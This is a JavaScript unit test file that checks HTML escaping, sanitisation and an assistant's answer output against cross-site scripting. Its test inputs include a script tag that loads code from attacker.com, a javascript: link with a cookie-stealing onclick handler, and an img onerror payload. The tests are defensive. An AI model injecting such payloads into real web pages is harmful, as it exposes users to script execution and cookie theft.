import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { escapeHTML, sanitizeHTML } from "../js/utils.js";
import { getAssistantAnswer } from "../js/assistant.js";

describe("Security Audit Tests", () => {
  test("Malicious script tags are neutralized by escapeHTML", () => {
    const payload = '<script src="http://attacker.com/xss.js"></script>';
    const result = escapeHTML(payload);
    assert.equal(result.includes("<script"), false);
  });

  test("Malicious inline event handlers are sanitized by sanitizeHTML", () => {
    const payload = '<a href="javascript:alert(1)" onclick="stealCookies()">Click Here</a>';
    const clean = sanitizeHTML(payload);
    assert.equal(clean.includes("onclick="), false);
    assert.equal(clean.includes("javascript:"), false);
  });

  test("Assistant answer output contains only safe sanitized HTML", () => {
    const payload = '<img src=x onerror=alert(1)> location';
    const res = getAssistantAnswer(payload);
    assert.equal(res.answer.includes("onerror="), false);
  });
});
